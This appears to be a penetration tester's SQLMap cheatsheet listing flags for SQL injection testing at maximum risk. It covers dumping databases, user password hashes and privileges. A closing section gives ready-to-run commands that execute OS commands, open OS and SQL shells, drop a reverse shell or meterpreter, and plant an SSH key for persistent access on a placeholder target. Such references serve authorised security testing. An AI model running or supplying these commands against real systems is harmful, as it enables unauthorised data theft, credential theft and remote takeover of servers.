# SQLMap cheatsheet

## Generic

```text
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3                    # MAX
--level=5                   # MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB"            # Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch                     # Non interactive mode to accept the defaults
--auth-type="<AUTH>"        # HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>"        # HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2"      # Help sqlmap identify union SQLi techniques with a weird union char
```

## Retrieve internal information

```text
--current-user              # Get current user
--is-dba                    # Check if current user is Admin
--hostname                  # Get hostname
--users                     # Get usernames od DB
--passwords                 # Get passwords of users in DB
--privileges                # Get privileges
```

## Retrieve external information

```text
--all                       # Retrieve everything
--dump                      # Dump DBMS database table entries
--dbs                       # Names of the available databases
--tables                    # Tables of a database ( -D <DB NAME> )
--columns                   # Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME>   # Dump column
```

## Shell

Execute a command (requires permission):

    # sqlmap -u "<target>/<pagename>.php?id=1" --os-cmd whoami

Simple shell (will not work when not having the permissions:

    # sqlmap -u "<target>/<pagename>.php?id=1" --os-shell

SQL shell:

    # sqlmap -u "<target>/<pagename>.php?id=1" --sql-shell

Dropping a reverse-shell/meterpreter (requires permissions):

    # sqlmap -u "<target>/<pagename>.php?id=1" --os-pwn

SSH Shell by dropping an SSH key:

    # sqlmap -u "<target>/<pagename>.php?id=1" --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/




